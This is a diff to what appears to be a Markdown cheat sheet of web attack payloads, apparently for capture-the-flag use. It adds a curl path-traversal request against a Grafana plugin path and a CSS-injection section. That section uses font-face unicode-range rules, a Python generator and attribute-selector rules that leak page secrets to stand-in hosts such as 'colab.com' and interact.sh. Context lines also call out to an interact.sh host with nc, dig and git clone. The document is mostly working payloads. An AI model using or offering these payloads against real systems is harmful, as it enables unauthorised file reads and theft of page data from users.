@@ -49,7 +49,11 @@ MySQL >=5.6
     nc nchere.xxx.interact.sh 80
     dig dighere.xxx.interact.sh
     git clone githere.xxx.interact.sh
-    
+
+### Path Traversal
+
+    curl --path-as-is grafana.example.com/public/plugins/alertmanager/../../../../../../../../tmp/flag
+
 ### Bypass
 
 #### utf8 normalization
@@ -61,6 +65,61 @@ MySQL >=5.6
       . 	%c0%2e %C0%AE 	%E0%80%AE 	%F0%80%80%AE 	Full stop 	
       / 	%c0%2f %C0%AF 	%E0%80%AF 	%F0%80%80%AF 	Solidus 	
       \ 	%c0%5c %C1%9C %c0%80%5c %E0%81%9C 	%F0%80%81%9C 	Reverse solidus
+
+### XSS
+
+#### CSS Injection
+
+Abuse unicode range to exfiltrate charset
+
+```css
+@font-face {
+    font-family:poc;
+    src:url('//colab.com/A');
+    unicode-range:U+0041;
+}
+@font-face {
+    font-family:poc;
+    src:url('//colab.com/B');
+    unicode-range:U+0042;
+}
+#secret {
+    font-family:poc;
+}
+...
+```
+Generator
+
+```python
+import string
+colab = "xxx.interact.sh"
+select = "h1"
+for l in string.ascii_letters:
+  print("@font-face{font-family:poc;src:url('//"+l+"."+colab+"/"+l+"');unicode-range:U+00"+ hex(ord(l))[2:]+";}",end="")
+print(select+"{font-family:poc;}")
+```
+
+Attribute selectors
+
+Contains: 
+
+```css
+a[href*="flag{"] {
+  ...
+}
+```
+
+Starts with:
+
+```css
+[class^="flag{A"] {
+  background:url('//colab.com/A');
+}
+[class^="flag{B"] {
+  background:url('//colab.com/B');
+}
+```
+
 
 ## Resources
 
